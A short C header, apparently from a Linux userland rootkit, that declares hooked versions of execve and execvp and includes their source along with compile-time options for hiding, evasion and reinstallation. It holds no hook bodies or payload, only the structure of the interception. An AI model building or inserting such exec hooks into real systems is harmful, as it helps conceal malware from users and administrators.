#ifndef EXEC_H
#define EXEC_H

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
#define CANTEVADE_ERR EPERM
#endif

#ifdef HIDING_UTIL
void option_err(void);
void dohiding_util(char *const argv[]);
#include "hiding_util.c"
#endif

int execve(const char *filename, char *const argv[], char *const envp[]);
#include "execve.c"

int execvp(const char *filename, char *const argv[]);
#include "execvp.c"
#endif
